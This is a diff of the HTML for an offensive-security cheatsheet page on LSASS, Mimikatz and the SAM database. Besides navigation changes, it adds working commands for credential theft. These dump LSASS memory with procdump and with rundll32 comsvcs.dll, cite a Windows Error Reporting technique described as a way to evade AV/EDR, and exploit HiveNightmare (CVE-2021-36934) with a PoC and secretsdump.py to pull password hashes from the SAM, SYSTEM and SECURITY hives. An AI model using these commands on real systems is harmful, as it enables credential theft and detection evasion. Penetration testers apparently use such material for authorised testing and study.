@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2021-07-14T16:39:38 CEST">
-<title>LSASS and Mimikatz :: Offensive Security Cheatsheet</title>
+<meta name="revised" content="2022-01-31T14:36:11 CET">
+<title>LSASS, Mimikatz, SAM :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -1259,7 +1259,7 @@
       <li data-nav-id="/windows-systems/privilege-escalation/lsass_mimikatz/" class="dd-item active">
         <div>
           <a href="/windows-systems/privilege-escalation/lsass_mimikatz/">
-            LSASS and Mimikatz
+            LSASS, Mimikatz, SAM
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1309,6 +1309,13 @@
         <div>
           <a href="/windows-systems/privilege-escalation/amsi_and_evasion/">
             AMSI Bypass and Evasion
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/spoolerservice/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/spoolerservice/">
+            Spooler Service
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1663,6 +1670,28 @@
     </li>
         </ul>
     </li>
+    <li data-nav-id="/defensive-monitoring-cti/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/defensive-monitoring-cti/">Defensive, Monitoring, CTI...</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/defensive-monitoring-cti/defensive_osint_cti/" class="dd-item">
+        <div>
+          <a href="/defensive-monitoring-cti/defensive_osint_cti/">
+            Defensive OSINT and CTI
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/defensive-monitoring-cti/defensive_active_directory/" class="dd-item">
+        <div>
+          <a href="/defensive-monitoring-cti/defensive_active_directory/">
+            Defensive Active Directory
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
     <li data-nav-id="/resources/" class="dd-item haschildren
         ">
       <div>
@@ -1745,7 +1774,7 @@
       <option value="/windows-systems/privilege-escalation/automated_recon/" >-- Automated Recon</option>
       <option value="/windows-systems/privilege-escalation/tricks/" >-- Tricks</option>
       <option value="/windows-systems/privilege-escalation/services_scheduled_tasks/" >-- Services &amp; Scheduled Tasks</option>
-      <option value="/windows-systems/privilege-escalation/lsass_mimikatz/"  selected>-- LSASS and Mimikatz</option>
+      <option value="/windows-systems/privilege-escalation/lsass_mimikatz/"  selected>-- LSASS, Mimikatz, SAM</option>
       <option value="/windows-systems/privilege-escalation/admin_processes/" >-- Admin and Processes</option>
       <option value="/windows-systems/privilege-escalation/dnsadmins_group/" >-- DNSadmins group</option>
       <option value="/windows-systems/privilege-escalation/delegations/" >-- Active Directory Delegations</option>
@@ -1753,6 +1782,7 @@
       <option value="/windows-systems/privilege-escalation/windows_defender/" >-- Windows Defender</option>
       <option value="/windows-systems/privilege-escalation/azure_ad/" >-- Azure AD</option>
       <option value="/windows-systems/privilege-escalation/amsi_and_evasion/" >-- AMSI Bypass and Evasion</option>
+      <option value="/windows-systems/privilege-escalation/spoolerservice/" >-- Spooler Service</option>
   
     <option value="/windows-systems/post-exploitation-techniques/" >
   - 
@@ -1772,6 +1802,8 @@
    Cryptography</option>
     <option value="/pwn/" >
    Pwn</option>
+    <option value="/defensive-monitoring-cti/" >
+   Defensive, Monitoring, CTI...</option>
     <option value="/resources/" >
    External Resources</option>
 
@@ -1796,7 +1828,7 @@
       </div>
     
 
-    <h1>LSASS and Mimikatz</h1>
+    <h1>LSASS, Mimikatz, SAM</h1>
     
     
     
@@ -1808,7 +1840,20 @@
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
 <span style="color:#75715e"># Several dumping methods here</span>
-https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/</code></pre></div>
+- https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/
+- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz
+- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md
+
+<span style="color:#75715e"># You can use the cmsvcs.dll DLL in order the dump LSASS (https://beta.hackndo.com/remote-lsass-dump-passwords/)</span>
+<span style="color:#75715e"># C:\Windows\System32</span>
+rundll32.exe C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>omsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Dumping LSASS using the Windows Error Reporting process</span>
+https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2
+
+<span style="color:#75715e"># Tool using SilentProcessExit</span>
+https://github.com/deepinstinct/LsassSilentProcessExit
+
+<span style="color:#75715e"># The idea is to use the legit WER functionnality to dump LSASS without crashing it</span>
+<span style="color:#75715e"># And to evade AV/EDR detection</span></code></pre></div>
 <p><br/></p>
 
 <h3 id="mimikatz">Mimikatz</h3>
@@ -1874,6 +1919,27 @@ pypykatz ldap TEST/victim/pw:@10.10.10.2 asrep
 
 <span style="color:#75715e"># Decrypt gpp-pass</span>
 pypykatz gppass &lt;base64_enc_password&gt;</code></pre></div>
+<p><br/></p>
+
+<h3 id="hivenightmare-serioussam-cve-2021-36934">HiveNightmare - SeriousSAM (CVE-2021-36934)</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Blogpost about the vuln</span>
+<span style="color:#75715e"># Explanations, detection, mitigation included</span>
+https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5
+
+<span style="color:#75715e"># PoC</span>
+https://github.com/GossiTheDog/HiveNightmare
+
+<span style="color:#75715e"># Recap : Non-admin local users can read some hives (including SAM, SECURITY, SYSTEM) on hosts</span>
+
+<span style="color:#75715e"># Impacted</span>
+<span style="color:#75715e"># All Windows 10 released throught the last 3 years</span>
+<span style="color:#75715e"># All versions since 1809</span>
+
+<span style="color:#75715e"># Usage</span>
+.<span style="color:#8045ff">\H</span>iveNightmare.exe <span style="color:#f92672">[</span>max shadow to look at<span style="color:#f92672">]</span>
+
+<span style="color:#75715e"># Then, get creds</span>
+python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL</code></pre></div>
 
     
     
